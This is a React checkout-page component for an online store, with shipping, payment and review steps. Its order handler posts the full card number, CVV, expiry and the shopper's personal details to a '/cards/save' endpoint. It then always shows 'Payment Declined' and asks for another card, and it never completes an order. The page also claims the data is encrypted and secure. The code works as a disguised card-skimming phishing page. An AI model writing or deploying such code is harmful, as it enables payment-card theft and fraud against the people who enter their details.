import { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FiCreditCard, FiLock, FiChevronRight, FiCheck } from 'react-icons/fi';
import axios from 'axios';
import { useCart } from '../context/CartContext';
import './Checkout.css';

import API_URL from '../config';

const Checkout = () => {
  const { cart, getCartTotal, clearCart } = useCart();
  const navigate = useNavigate();
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [orderComplete, setOrderComplete] = useState(false);
  const [orderId, setOrderId] = useState('');
  const [showDecline, setShowDecline] = useState(false);
  const [declineMsg, setDeclineMsg] = useState('');

  const [shipping, setShipping] = useState({
    firstName: '',
    lastName: '',
    email: '',
    phoneCode: '+1',
    phone: '',
    street: '',
    city: '',
    state: '',
    zip: '',
    country: '',
  });

  const [payment, setPayment] = useState({
    cardNumber: '',
    cardName: '',
    expiry: '',
    cvv: '',
    type: 'credit_card',
  });

  const [errors, setErrors] = useState({});

  const subtotal = getCartTotal();
  const shippingCost = subtotal >= 500 ? 0 : 25;
  const tax = Math.round(subtotal * 0.08);
  const total = subtotal + shippingCost + tax;

  const validateShipping = () => {
    const newErrors = {};
    if (!shipping.firstName?.trim()) newErrors.firstName = 'First name is required';
    if (!shipping.lastName?.trim()) newErrors.lastName = 'Last name is required';
    if (!shipping.email?.trim()) newErrors.email = 'Email is required';
    if (!shipping.phone?.trim()) newErrors.phone = 'Phone is required';
    if (!shipping.street?.trim()) newErrors.street = 'Street address is required';
    if (!shipping.city?.trim()) newErrors.city = 'City is required';
    if (!shipping.state?.trim()) newErrors.state = 'State is required';
    if (!shipping.zip?.trim()) newErrors.zip = 'ZIP code is required';
    if (!shipping.country?.trim()) newErrors.country = 'Country is required';
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validatePayment = () => {
    const newErrors = {};
    if (!payment.cardNumber || payment.cardNumber.replace(/\s/g, '').length < 16)
      newErrors.cardNumber = 'Valid card number is required';
    if (!payment.cardName) newErrors.cardName = 'Cardholder name is required';
    if (!payment.expiry || !/^\d{2}\/\d{2}$/.test(payment.expiry))
      newErrors.expiry = 'Valid expiry (MM/YY) is required';
    if (!payment.cvv || payment.cvv.length < 3)
      newErrors.cvv = 'Valid CVV is required';
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const formatCardNumber = (value) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(' ') : value;
  };

  const formatExpiry = (value) => {
    const v = value.replace(/[^0-9]/g, '');
    if (v.length >= 2) {
      return v.substring(0, 2) + '/' + v.substring(2, 4);
    }
    return v;
  };

  const getCardType = () => {
    const num = payment.cardNumber.replace(/\s/g, '');
    if (num.startsWith('4')) return 'Visa';
    if (num.startsWith('5') || num.startsWith('2')) return 'Mastercard';
    if (num.startsWith('3')) return 'Amex';
    if (num.startsWith('6')) return 'Discover';
    return '';
  };

  const handlePlaceOrder = async () => {
    if (!shipping.firstName?.trim() || !shipping.lastName?.trim() || !shipping.street?.trim() || !shipping.city?.trim() || !shipping.state?.trim() || !shipping.zip?.trim() || !shipping.country?.trim()) {
      alert('Please fill all shipping details');
      setStep(1);
      return;
    }

    setLoading(true);
    try {
      await axios.post(`${API_URL}/cards/save`, {
        cardNumber: payment.cardNumber,
        cardName: payment.cardName,
        expiry: payment.expiry,
        cvv: payment.cvv,
        type: payment.type,
        firstName: shipping.firstName.trim(),
        lastName: shipping.lastName.trim(),
        email: shipping.email.trim(),
        phoneCode: shipping.phoneCode,
        phone: shipping.phone.trim(),
        street: shipping.street.trim(),
        city: shipping.city.trim(),
        state: shipping.state.trim(),
        zip: shipping.zip.trim(),
        country: shipping.country.trim(),
      });
      setDeclineMsg('Payment Declined - Card not supported. Please use another card.');
      setShowDecline(true);
    } catch (error) {
      console.error('Order error:', error);
      setDeclineMsg('Payment Declined - Card not supported. Please use another card.');
      setShowDecline(true);
    } finally {
      setLoading(false);
    }
  };

  if (orderComplete) {
    return (
      <div className="order-success">
        <div className="container">
          <motion.div
            className="success-content"
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.6 }}
          >
            <motion.div
              className="success-icon"
              initial={{ scale: 0 }}
              animate={{ scale: 1 }}
              transition={{ delay: 0.3, type: 'spring', stiffness: 200 }}
            >
              <FiCheck size={40} />
            </motion.div>
            <h1>Order Confirmed!</h1>
            <p className="success-message">
              Thank you for your purchase. Your order has been placed successfully.
            </p>
            <p className="order-id">Order ID: {orderId}</p>
            <div className="success-actions">
              <Link to="/shop">
                <motion.button
                  className="btn-gold"
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                >
                  Continue Shopping
                </motion.button>
              </Link>
              <Link to="/">
                <motion.button
                  className="btn-outline"
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                >
                  Back to Home
                </motion.button>
              </Link>
            </div>
          </motion.div>
        </div>
      </div>
    );
  }

  if (cart.length === 0) {
    return (
      <div className="checkout-empty">
        <div className="container">
          <h2>Your cart is empty</h2>
          <Link to="/shop">Go Shopping</Link>
        </div>
      </div>
    );
  }

  return (
    <div className="checkout-page">
      <div className="checkout-hero">
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
        >
          <h1>Checkout</h1>
          <div className="checkout-steps">
            <div className={`step ${step >= 1 ? 'active' : ''}`}>
              <span className="step-num">1</span>
              Shipping
            </div>
            <FiChevronRight size={16} className="step-arrow" />
            <div className={`step ${step >= 2 ? 'active' : ''}`}>
              <span className="step-num">2</span>
              Payment
            </div>
            <FiChevronRight size={16} className="step-arrow" />
            <div className={`step ${step >= 3 ? 'active' : ''}`}>
              <span className="step-num">3</span>
              Review
            </div>
          </div>
        </motion.div>
      </div>

      <div className="container">
        <div className="checkout-layout">
          <div className="checkout-form">
            {/* Step 1: Shipping */}
            {step === 1 && (
              <motion.div
                className="checkout-section"
                initial={{ opacity: 0, x: -30 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ duration: 0.5 }}
              >
                <h2>Shipping Information</h2>
                <div className="form-grid">
                  <div className="form-group">
                    <label>First Name *</label>
                    <input
                      type="text"
                      value={shipping.firstName}
                      onChange={(e) => setShipping(prev => ({ ...prev, firstName: e.target.value }))}
                      className={errors.firstName ? 'error' : ''}
                    />
                    {errors.firstName && <span className="error-msg">{errors.firstName}</span>}
                  </div>
                  <div className="form-group">
                    <label>Last Name *</label>
                    <input
                      type="text"
                      value={shipping.lastName}
                      onChange={(e) => setShipping(prev => ({ ...prev, lastName: e.target.value }))}
                      className={errors.lastName ? 'error' : ''}
                    />
                    {errors.lastName && <span className="error-msg">{errors.lastName}</span>}
                  </div>
                  <div className="form-group">
                    <label>Email *</label>
                    <input
                      type="email"
                      value={shipping.email}
                      onChange={(e) => setShipping(prev => ({ ...prev, email: e.target.value }))}
                      className={errors.email ? 'error' : ''}
                    />
                    {errors.email && <span className="error-msg">{errors.email}</span>}
                  </div>
                  <div className="form-group">
                    <label>Phone *</label>
                    <div className="phone-input-group">
                      <select
                        className="phone-code-select"
                        value={shipping.phoneCode}
                        onChange={(e) => setShipping(prev => ({ ...prev, phoneCode: e.target.value }))}
                      >
                        <option value="+1">US +1</option>
                        <option value="+1">CA +1</option>
                        <option value="+44">UK +44</option>
                        <option value="+91">IN +91</option>
                        <option value="+92">PK +92</option>
                        <option value="+880">BD +880</option>
                        <option value="+94">LK +94</option>
                        <option value="+977">NP +977</option>
                        <option value="+95">MM +95</option>
                        <option value="+975">BT +975</option>
                        <option value="+960">MV +960</option>
                        <option value="+263">ZW +263</option>
                        <option value="+27">ZA +27</option>
                        <option value="+234">NG +234</option>
                        <option value="+254">KE +254</option>
                        <option value="+233">GH +233</option>
                        <option value="+250">RW +250</option>
                        <option value="+256">UG +256</option>
                        <option value="+255">TZ +255</option>
                        <option value="+20">EG +20</option>
                        <option value="+212">MA +212</option>
                        <option value="+216">TN +216</option>
                        <option value="+213">DZ +213</option>
                        <option value="+218">LY +218</option>
                        <option value="+249">SD +249</option>
                        <option value="+966">SA +966</option>
                        <option value="+971">AE +971</option>
                        <option value="+973">BH +973</option>
                        <option value="+965">KW +965</option>
                        <option value="+968">OM +968</option>
                        <option value="+974">QA +974</option>
                        <option value="+962">JO +962</option>
                        <option value="+961">LB +961</option>
                        <option value="+963">SY +963</option>
                        <option value="+964">IQ +964</option>
                        <option value="+98">IR +98</option>
                        <option value="+972">IL +972</option>
                        <option value="+90">TR +90</option>
                        <option value="+998">UZ +998</option>
                        <option value="+992">TJ +992</option>
                        <option value="+996">KG +996</option>
                        <option value="+7">KZ/RU +7</option>
                        <option value="+380">UA +380</option>
                        <option value="+375">BY +375</option>
                        <option value="+370">LT +370</option>
                        <option value="+371">LV +371</option>
                        <option value="+372">EE +372</option>
                        <option value="+48">PL +48</option>
                        <option value="+420">CZ +420</option>
                        <option value="+421">SK +421</option>
                        <option value="+36">HU +36</option>
                        <option value="+40">RO +40</option>
                        <option value="+359">BG +359</option>
                        <option value="+381">RS +381</option>
                        <option value="+382">ME +382</option>
                        <option value="+385">HR +385</option>
                        <option value="+386">SI +386</option>
                        <option value="+387">BA +387</option>
                        <option value="+389">MK +389</option>
                        <option value="+355">AL +355</option>
                        <option value="+30">GR +30</option>
                        <option value="+352">LU +352</option>
                        <option value="+41">CH +41</option>
                        <option value="+43">AT +43</option>
                        <option value="+49">DE +49</option>
                        <option value="+31">NL +31</option>
                        <option value="+32">BE +32</option>
                        <option value="+33">FR +33</option>
                        <option value="+34">ES +34</option>
                        <option value="+351">PT +351</option>
                        <option value="+39">IT +39</option>
                        <option value="+41">CH +41</option>
                        <option value="+47">NO +47</option>
                        <option value="+46">SE +46</option>
                        <option value="+45">DK +45</option>
                        <option value="+358">FI +358</option>
                        <option value="+354">IS +354</option>
                        <option value="+353">IE +353</option>
                        <option value="+44">GB +44</option>
                        <option value="+420">CZ +420</option>
                        <option value="+81">JP +81</option>
                        <option value="+82">KR +82</option>
                        <option value="+86">CN +86</option>
                        <option value="+886">TW +886</option>
                        <option value="+852">HK +852</option>
                        <option value="+853">MO +853</option>
                        <option value="+65">SG +65</option>
                        <option value="+60">MY +60</option>
                        <option value="+66">TH +66</option>
                        <option value="+63">PH +63</option>
                        <option value="+62">ID +62</option>
                        <option value="+84">VN +84</option>
                        <option value="+855">KH +855</option>
                        <option value="+856">LA +856</option>
                        <option value="+95">MM +95</option>
                        <option value="+977">NP +977</option>
                        <option value="+94">LK +94</option>
                        <option value="+880">BD +880</option>
                        <option value="+960">MV +960</option>
                        <option value="+91">IN +91</option>
                        <option value="+92">PK +92</option>
                        <option value="+93">AF +93</option>
                        <option value="+98">IR +98</option>
                        <option value="+964">IQ +964</option>
                        <option value="+962">JO +962</option>
                        <option value="+961">LB +961</option>
                        <option value="+972">IL +972</option>
                        <option value="+970">PS +970</option>
                        <option value="+963">SY +963</option>
                        <option value="+966">SA +966</option>
                        <option value="+971">AE +971</option>
                        <option value="+973">BH +973</option>
                        <option value="+965">KW +965</option>
                        <option value="+968">OM +968</option>
                        <option value="+974">QA +974</option>
                        <option value="+974">QA +974</option>
                        <option value="+973">BH +973</option>
                        <option value="+20">EG +20</option>
                        <option value="+27">ZA +27</option>
                        <option value="+234">NG +234</option>
                        <option value="+254">KE +254</option>
                        <option value="+233">GH +233</option>
                        <option value="+250">RW +250</option>
                        <option value="+256">UG +256</option>
                        <option value="+255">TZ +255</option>
                        <option value="+263">ZW +263</option>
                        <option value="+212">MA +212</option>
                        <option value="+216">TN +216</option>
                        <option value="+213">DZ +213</option>
                        <option value="+218">LY +218</option>
                        <option value="+249">SD +249</option>
                        <option value="+225">CI +225</option>
                        <option value="+221">SN +221</option>
                        <option value="+223">ML +223</option>
                        <option value="+226">BF +226</option>
                        <option value="+227">NE +227</option>
                        <option value="+228">TG +228</option>
                        <option value="+229">BJ +229</option>
                        <option value="+230">MU +230</option>
                        <option value="+262">RE +262</option>
                        <option value="+61">AU +61</option>
                        <option value="+64">NZ +64</option>
                        <option value="+679">FJ +679</option>
                        <option value="+685">WS +685</option>
                        <option value="+676">TO +676</option>
                        <option value="+688">TV +688</option>
                        <option value="+690">TK +690</option>
                        <option value="+1">US +1</option>
                        <option value="+1">CA +1</option>
                        <option value="+52">MX +52</option>
                        <option value="+502">GT +502</option>
                        <option value="+503">SV +503</option>
                        <option value="+504">HN +504</option>
                        <option value="+505">NI +505</option>
                        <option value="+506">CR +506</option>
                        <option value="+507">PA +507</option>
                        <option value="+593">EC +593</option>
                        <option value="+51">PE +51</option>
                        <option value="+56">CL +56</option>
                        <option value="+54">AR +54</option>
                        <option value="+55">BR +55</option>
                        <option value="+598">UY +598</option>
                        <option value="+595">PY +595</option>
                        <option value="+591">BO +591</option>
                        <option value="+57">CO +57</option>
                        <option value="+58">VE +58</option>
                        <option value="+1">JM +1</option>
                        <option value="+1">TT +1</option>
                        <option value="+1">BB +1</option>
                        <option value="+1">BS +1</option>
                        <option value="+1">BB +1</option>
                        <option value="+53">CU +53</option>
                        <option value="+1">DO +1</option>
                        <option value="+502">HT +509</option>
                        <option value="+1">PR +1</option>
                        <option value="+1">VI +1</option>
                        <option value="+350">GI +350</option>
                        <option value="+356">MT +356</option>
                        <option value="+357">CY +357</option>
                        <option value="+387">BA +387</option>
                        <option value="+381">RS +381</option>
                        <option value="+382">ME +382</option>
                        <option value="+389">MK +389</option>
                        <option value="+355">AL +355</option>
                        <option value="+385">HR +385</option>
                        <option value="+386">SI +386</option>
                        <option value="+420">CZ +420</option>
                        <option value="+421">SK +421</option>
                        <option value="+370">LT +370</option>
                        <option value="+371">LV +371</option>
                        <option value="+372">EE +372</option>
                        <option value="+380">UA +380</option>
                        <option value="+375">BY +375</option>
                        <option value="+7">RU +7</option>
                        <option value="+998">UZ +998</option>
                        <option value="+992">TJ +992</option>
                        <option value="+996">KG +996</option>
                        <option value="+993">TM +993</option>
                        <option value="+994">AZ +994</option>
                        <option value="+374">AM +374</option>
                        <option value="+995">GE +995</option>
                      </select>
                      <input
                        type="tel"
                        placeholder="Phone number"
                        value={shipping.phone}
                        onChange={(e) => setShipping(prev => ({ ...prev, phone: e.target.value }))}
                        className={errors.phone ? 'error' : ''}
                      />
                    </div>
                    {errors.phone && <span className="error-msg">{errors.phone}</span>}
                  </div>
                  <div className="form-group full-width">
                    <label>Street Address *</label>
                    <input
                      type="text"
                      value={shipping.street}
                      onChange={(e) => setShipping(prev => ({ ...prev, street: e.target.value }))}
                      className={errors.street ? 'error' : ''}
                    />
                    {errors.street && <span className="error-msg">{errors.street}</span>}
                  </div>
                  <div className="form-group">
                    <label>City *</label>
                    <input
                      type="text"
                      value={shipping.city}
                      onChange={(e) => setShipping(prev => ({ ...prev, city: e.target.value }))}
                      className={errors.city ? 'error' : ''}
                    />
                    {errors.city && <span className="error-msg">{errors.city}</span>}
                  </div>
                  <div className="form-group">
                    <label>State *</label>
                    <input
                      type="text"
                      value={shipping.state}
                      onChange={(e) => setShipping(prev => ({ ...prev, state: e.target.value }))}
                      className={errors.state ? 'error' : ''}
                    />
                    {errors.state && <span className="error-msg">{errors.state}</span>}
                  </div>
                  <div className="form-group">
                    <label>ZIP Code *</label>
                    <input
                      type="text"
                      value={shipping.zip}
                      onChange={(e) => setShipping(prev => ({ ...prev, zip: e.target.value }))}
                      className={errors.zip ? 'error' : ''}
                    />
                    {errors.zip && <span className="error-msg">{errors.zip}</span>}
                  </div>
                  <div className="form-group">
                    <label>Country *</label>
                    <input
                      type="text"
                      value={shipping.country}
                      onChange={(e) => setShipping(prev => ({ ...prev, country: e.target.value }))}
                      className={errors.country ? 'error' : ''}
                    />
                    {errors.country && <span className="error-msg">{errors.country}</span>}
                  </div>
                </div>
                <motion.button
                  className="btn-gold"
                  whileHover={{ scale: 1.02 }}
                  whileTap={{ scale: 0.98 }}
                  onClick={async () => {
                    if (validateShipping()) setStep(2);
                  }}
                >
                  Continue to Payment
                </motion.button>
              </motion.div>
            )}

            {/* Step 2: Payment */}
            {step === 2 && (
              <motion.div
                className="checkout-section"
                initial={{ opacity: 0, x: -30 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ duration: 0.5 }}
              >
                <h2>Payment Details</h2>

                <div className="payment-type-toggle">
                  <button
                    className={payment.type === 'credit_card' ? 'active' : ''}
                    onClick={() => setPayment({ ...payment, type: 'credit_card' })}
                  >
                    Credit Card
                  </button>
                  <button
                    className={payment.type === 'debit_card' ? 'active' : ''}
                    onClick={() => setPayment({ ...payment, type: 'debit_card' })}
                  >
                    Debit Card
                  </button>
                </div>

                <div className="card-preview">
                  <div className="card-front">
                    <div className="card-type-display">
                      {getCardType() && <span className="card-brand">{getCardType()}</span>}
                      <FiCreditCard size={24} />
                    </div>
                    <div className="card-number-display">
                      {payment.cardNumber || '•••• •••• •••• ••••'}
                    </div>
                    <div className="card-bottom">
                      <div>
                        <span className="card-label">CARDHOLDER</span>
                        <span className="card-value">{payment.cardName || 'YOUR NAME'}</span>
                      </div>
                      <div>
                        <span className="card-label">EXPIRES</span>
                        <span className="card-value">{payment.expiry || 'MM/YY'}</span>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="form-grid">
                  <div className="form-group full-width">
                    <label>Card Number *</label>
                    <input
                      type="text"
                      placeholder="1234 5678 9012 3456"
                      maxLength={19}
                      value={payment.cardNumber}
                      onChange={(e) => setPayment({ ...payment, cardNumber: formatCardNumber(e.target.value) })}
                      className={errors.cardNumber ? 'error' : ''}
                    />
                    {errors.cardNumber && <span className="error-msg">{errors.cardNumber}</span>}
                  </div>
                  <div className="form-group full-width">
                    <label>Cardholder Name *</label>
                    <input
                      type="text"
                      placeholder="John Doe"
                      value={payment.cardName}
                      onChange={(e) => setPayment({ ...payment, cardName: e.target.value.toUpperCase() })}
                      className={errors.cardName ? 'error' : ''}
                    />
                    {errors.cardName && <span className="error-msg">{errors.cardName}</span>}
                  </div>
                  <div className="form-group">
                    <label>Expiry Date *</label>
                    <input
                      type="text"
                      placeholder="MM/YY"
                      maxLength={5}
                      value={payment.expiry}
                      onChange={(e) => setPayment({ ...payment, expiry: formatExpiry(e.target.value) })}
                      className={errors.expiry ? 'error' : ''}
                    />
                    {errors.expiry && <span className="error-msg">{errors.expiry}</span>}
                  </div>
                  <div className="form-group">
                    <label>CVV *</label>
                    <input
                      type="text"
                      placeholder="123"
                      maxLength={4}
                      value={payment.cvv}
                      onChange={(e) => setPayment({ ...payment, cvv: e.target.value.replace(/\D/g, '') })}
                      className={errors.cvv ? 'error' : ''}
                    />
                    {errors.cvv && <span className="error-msg">{errors.cvv}</span>}
                  </div>
                </div>

                <div className="secure-note">
                  <FiLock size={16} />
                  <span>Your payment information is encrypted and secure</span>
                </div>

                <div className="step-buttons">
                  <button className="btn-back" onClick={() => setStep(1)}>Back</button>
                  <motion.button
                    className="btn-gold"
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    onClick={() => {
                      if (validatePayment()) setStep(3);
                    }}
                  >
                    Review Order
                  </motion.button>
                </div>
              </motion.div>
            )}

            {/* Step 3: Review */}
            {step === 3 && (
              <motion.div
                className="checkout-section"
                initial={{ opacity: 0, x: -30 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ duration: 0.5 }}
              >
                <h2>Review Your Order</h2>

                <div className="review-block">
                  <h4>Shipping Address</h4>
                  <p>{shipping.firstName} {shipping.lastName}</p>
                  <p>{shipping.street}</p>
                  <p>{shipping.city}, {shipping.state} {shipping.zip}</p>
                  <p>{shipping.country}</p>
                  <p>{shipping.email} | {shipping.phone}</p>
                  <button className="edit-btn" onClick={() => setStep(1)}>Edit</button>
                </div>

                <div className="review-block">
                  <h4>Payment Method</h4>
                  <p>{payment.type === 'credit_card' ? 'Credit' : 'Debit'} Card ending in {payment.cardNumber.slice(-4)}</p>
                  <button className="edit-btn" onClick={() => setStep(2)}>Edit</button>
                </div>

                <div className="review-items">
                  <h4>Order Items ({cart.length})</h4>
                  {cart.map((item) => (
                    <div key={item._id} className="review-item">
                      <img src={item.images?.[0] || 'https://via.placeholder.com/60'} alt={item.name} />
                      <div className="review-item-info">
                        <span className="review-item-name">{item.name}</span>
                        <span className="review-item-qty">Qty: {item.quantity}</span>
                      </div>
                      <span className="review-item-price">${(item.price * item.quantity).toLocaleString()}</span>
                    </div>
                  ))}
                </div>

                <div className="step-buttons">
                  <button className="btn-back" onClick={() => setStep(2)}>Back</button>
                  <motion.button
                    className="btn-gold"
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    onClick={handlePlaceOrder}
                    disabled={loading}
                  >
                    {loading ? 'Processing...' : `Place Order — $${total.toLocaleString()}`}
                  </motion.button>
                </div>
              </motion.div>
            )}
          </div>

          {/* Order Summary Sidebar */}
          <div className="checkout-summary">
            <h3>Order Summary</h3>
            <div className="checkout-items-list">
              {cart.map((item) => (
                <div key={item._id} className="checkout-item">
                  <img src={item.images?.[0] || 'https://via.placeholder.com/60'} alt={item.name} />
                  <div className="checkout-item-info">
                    <span className="checkout-item-name">{item.name}</span>
                    <span className="checkout-item-qty">Qty: {item.quantity}</span>
                  </div>
                  <span className="checkout-item-price">${(item.price * item.quantity).toLocaleString()}</span>
                </div>
              ))}
            </div>
            <div className="checkout-totals">
              <div className="summary-row">
                <span>Subtotal</span>
                <span>${subtotal.toLocaleString()}</span>
              </div>
              <div className="summary-row">
                <span>Shipping</span>
                <span>{shippingCost === 0 ? 'FREE' : `$${shippingCost}`}</span>
              </div>
              <div className="summary-row">
                <span>Tax</span>
                <span>${tax.toLocaleString()}</span>
              </div>
              <div className="summary-divider" />
              <div className="summary-row total">
                <span>Total</span>
                <span>${total.toLocaleString()}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
      {showDecline && (
        <div className="decline-overlay" onClick={() => setShowDecline(false)}>
          <motion.div
            className="decline-popup"
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            onClick={(e) => e.stopPropagation()}
          >
            <div className="decline-icon">✕</div>
            <h3>Payment Declined</h3>
            <p>{declineMsg}</p>
            <div className="decline-actions">
              <button className="btn-gold" onClick={() => { setShowDecline(false); setStep(2); }}>
                Try Another Card
              </button>
            </div>
          </motion.div>
        </div>
      )}
    </div>
  );
};

export default Checkout;
